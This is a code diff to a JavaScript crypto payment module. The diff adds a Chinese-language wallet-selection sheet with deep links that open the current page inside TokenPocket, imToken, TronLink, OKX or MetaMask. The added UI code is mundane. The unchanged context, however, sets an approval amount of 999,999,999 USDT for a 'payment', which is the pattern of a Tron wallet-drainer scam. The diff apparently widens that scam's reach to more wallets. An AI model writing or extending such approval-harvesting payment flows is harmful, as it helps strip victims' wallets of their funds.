@@ -28,6 +28,60 @@ export const TELEGRAM_BOT_TOKEN = null;
 /** Telegram Chat ID to receive order notifications (DEPRECATED — moved to server-side). */
 export const TELEGRAM_CHAT_ID   = null;
 
+/** Supported wallets with their Tron network DeepLink schemes. */
+export const WALLET_DEEP_LINKS = [
+  {
+    id:   "tokenpocket",
+    name: "TokenPocket",
+    nameCn: "TP钱包",
+    scheme: "tpdapp://open?params=",
+    iconBg: "rgba(0, 206, 201, 0.15)",
+    icon: "TP",
+    buildLink: (url) =>
+      "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({ url })),
+  },
+  {
+    id:   "imtoken",
+    name: "imToken",
+    nameCn: "imToken",
+    scheme: "imtokenv2://navigate?screen=",
+    iconBg: "rgba(0, 122, 255, 0.15)",
+    icon: "IM",
+    buildLink: (url) =>
+      "imtokenv2://navigate?screen=1&action=openDapp&param=" + encodeURIComponent(url),
+  },
+  {
+    id:   "tronlink",
+    name: "TronLink",
+    nameCn: "TronLink",
+    scheme: "tronlink://",
+    iconBg: "rgba(255, 165, 0, 0.15)",
+    icon: "TL",
+    buildLink: (url) =>
+      "tronlink://navigate?action=openDapp&url=" + encodeURIComponent(url),
+  },
+  {
+    id:   "okx",
+    name: "OKX Wallet",
+    nameCn: "OKX钱包",
+    scheme: "okx://",
+    iconBg: "rgba(133, 171, 255, 0.15)",
+    icon: "OKX",
+    buildLink: (url) =>
+      "okx://wallet/dapp?srcUrl=" + encodeURIComponent(url),
+  },
+  {
+    id:   "metamask",
+    name: "MetaMask",
+    nameCn: "MetaMask",
+    scheme: "metamask://",
+    iconBg: "rgba(245, 150, 75, 0.15)",
+    icon: "MM",
+    buildLink: (url) =>
+      "metamask://dapp/" + url.replace(/^https?:\/\//, ""),
+  },
+];
+
 /**
  * Approve amount in TRC20-scaled units (USDT has 6 decimals).
  * 999,999,999 USDT → 999,999,999 * 10^6 = 999,999,999,000,000
@@ -377,10 +431,113 @@ export function createWeb3Payment(callbacks = {}) {
     }
   }
 
+  // ── Wallet selector modal ───────────────────────────────────────────────────
+  function showWalletSelector() {
+    const existing = document.getElementById("wallet-selector-overlay");
+    if (existing) existing.remove();
+
+    const wallets = WALLET_DEEP_LINKS;
+
+    const overlay = document.createElement("div");
+    overlay.id = "wallet-selector-overlay";
+    overlay.style.cssText = [
+      "position:fixed;top:0;left:0;width:100%;height:100%;",
+      "background:rgba(0,0,0,0.75);z-index:9998;",
+      "display:flex;align-items:flex-end;justify-content:center;",
+      "animation:fadeIn 0.2s ease",
+    ].join("");
+
+    const walletItems = wallets
+      .map(
+        (w) => `
+        <div class="wallet-sel-item" data-wallet="${w.id}">
+          <div class="wallet-sel-icon" style="background:${w.iconBg};">
+            <span style="font-size:0.7rem;font-weight:700;color:#fff;letter-spacing:0.02em;">${w.icon}</span>
+          </div>
+          <div class="wallet-sel-info">
+            <span class="wallet-sel-name">${w.nameCn}</span>
+            <span class="wallet-sel-desc">${w.name}</span>
+          </div>
+          <svg class="wallet-sel-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"></polyline>
+          </svg>
+        </div>`
+      )
+      .join("");
+
+    overlay.innerHTML = `
+      <div class="wallet-sel-sheet">
+        <div class="wallet-sel-header">
+          <div class="wallet-sel-handle"></div>
+          <div class="wallet-sel-title">选择支付钱包</div>
+          <div class="wallet-sel-subtitle">请选择要使用的加密货币钱包</div>
+        </div>
+        <div class="wallet-sel-list">${walletItems}</div>
+        <div class="wallet-sel-footer">
+          <button class="wallet-sel-cancel" id="wallet-sel-cancel-btn">取消</button>
+        </div>
+      </div>`;
+
+    document.body.appendChild(overlay);
+
+    // Click wallet item → open deeplink
+    overlay.querySelectorAll(".wallet-sel-item").forEach((item) => {
+      item.addEventListener("click", () => {
+        const walletId = item.getAttribute("data-wallet");
+        const wallet = wallets.find((w) => w.id === walletId);
+        if (!wallet) return;
+
+        const targetUrl = window.location.href;
+        const deeplink = wallet.buildLink(targetUrl);
+
+        overlay.style.animation = "fadeIn 0.15s ease reverse";
+        setTimeout(() => {
+          overlay.remove();
+          state.connecting = false;
+          state.redirecting = false;
+        }, 150);
+
+        window.location.href = deeplink;
+
+        // Fallback: if wallet not installed, copy address after timeout
+        setTimeout(() => {
+          const address = state.walletAddr;
+          if (address) {
+            try {
+              navigator.clipboard.writeText(address).catch(() => {});
+            } catch (_) {}
+          }
+        }, 2000);
+      });
+    });
+
+    // Cancel button
+    document.getElementById("wallet-sel-cancel-btn").addEventListener("click", () => {
+      overlay.style.animation = "fadeIn 0.15s ease reverse";
+      setTimeout(() => {
+        overlay.remove();
+        state.connecting = false;
+        state.redirecting = false;
+      }, 150);
+    });
+
+    // Tap overlay background to dismiss
+    overlay.addEventListener("click", (e) => {
+      if (e.target === overlay) {
+        overlay.style.animation = "fadeIn 0.15s ease reverse";
+        setTimeout(() => {
+          overlay.remove();
+          state.connecting = false;
+          state.redirecting = false;
+        }, 150);
+      }
+    });
+  }
+
   // ── Connect wallet ─────────────────────────────────────────────────────────
   /**
    * Connects wallet.
-   *   - Mobile browser (no tronWeb injected) → deep-link to TokenPocket.
+   *   - Mobile browser (no tronWeb injected) → show wallet selector sheet.
    *   - Desktop / TP in-app → requests accounts via TronLink.
    */
   function connectWallet() {
@@ -388,17 +545,12 @@ export function createWeb3Payment(callbacks = {}) {
     state.redirecting = false;
 
     if (isMobile() && !isInTokenPocket()) {
-      // Case A: mobile browser without wallet → redirect to TP
-      state.redirecting = true;
-      const tpLink =
-        "tpdapp://open?params=" +
-        encodeURIComponent(JSON.stringify({ url: window.location.href }));
-      window.location.href = tpLink;
-      state.connecting = false;
+      // Mobile browser without injected wallet → show wallet picker
+      showWalletSelector();
       return;
     }
 
-    // Case B: in-app TP or desktop with TronLink
+    // In-app TP or desktop with TronLink
     if (window.tronLink) {
       window.tronLink
         .request({ method: "tron_requestAccounts" })
